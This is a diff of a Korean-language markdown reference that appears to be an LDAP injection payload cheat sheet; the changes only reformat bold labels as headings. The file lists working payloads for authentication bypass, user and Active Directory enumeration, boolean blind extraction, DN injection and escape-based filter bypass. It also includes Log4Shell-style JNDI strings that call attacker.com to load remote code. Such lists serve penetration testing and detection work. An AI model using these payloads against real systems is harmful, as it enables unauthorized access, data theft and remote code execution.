@@ -7,19 +7,19 @@
 - `*)(&)` (username — 항상 참)
 - `admin)(!(uid=admin)` (username — admin 제외 모든 사용자)
 
-**Password 와일드카드:**
+#### Password 와일드카드
 - `*` (password — 모든 password 매칭)
 - `admin)(uid=*))(|(uid=*` + 임의 password
 - `*)(uid=*))(&(uid=admin)(password=*` (password)
 
-**JSON body:**
+#### JSON body
 ```json
 {"username":"admin)(|(uid=*","password":"x"}
 {"username":"admin)(&)","password":"x"}
 {"username":"admin","password":"*"}
 ```
 
-**정보 유출:**
+#### 정보 유출
 - `*` (모든 매칭)
 - `admin)(|(uid=*)` (전체 사용자)
 - `(objectClass=*)` (모든 객체)
@@ -27,7 +27,7 @@
 - `(userAccountControl:1.2.840.113556.1.4.803:=2)` (비활성 계정 — AD)
 - `(userAccountControl:1.2.840.113556.1.4.803:=8192)` (Domain Controller)
 
-**Blind extraction (Boolean):**
+#### Blind extraction (Boolean)
 ```
 # 첫 글자 추측
 admin*&password=*    → 매치되면 admin*로 시작하는 사용자 존재
@@ -43,7 +43,7 @@ cn=evil,ou=people\,dc=target,dc=com
 cn=user,ou=admin\,ou=people,dc=x
 ```
 
-**JNDI lookup (Log4Shell 변형, `JNDI_LOOKUP` 라벨):**
+#### JNDI lookup (Log4Shell 변형, `JNDI_LOOKUP` 라벨)
 - `${jndi:ldap://attacker.com/Exploit}` (User-Agent / 임의 입력)
 - `${jndi:ldaps://attacker.com/x}`
 - `${jndi:rmi://attacker.com/x}`
@@ -56,7 +56,7 @@ cn=user,ou=admin\,ou=people,dc=x
 ?attrs=*  (모든 속성 노출)
 ```
 
-**Anonymous bind 시도:**
+#### Anonymous bind 시도
 ```
 # bind DN/password 없이 검색 가능 시 익명 검색
 ldapsearch -h target -x -b "dc=target,dc=com" "(objectClass=*)"
@@ -76,7 +76,7 @@ ldapsearch -h target -x -b "dc=target,dc=com" "(objectClass=*)"
 | Anonymous bind 차단 | bind DN 약한 자격증명 brute force, default credentials |
 | Referral chasing 차단 | 외부 LDAP 가리키는 alias |
 
-**Hex/Unicode escape 우회:**
+#### Hex/Unicode escape 우회
 ```
 # 일부 서버가 \HH escape 디코딩
 admin\29\28\7C\28uid\3D\2A    (= admin)(|(uid=*)
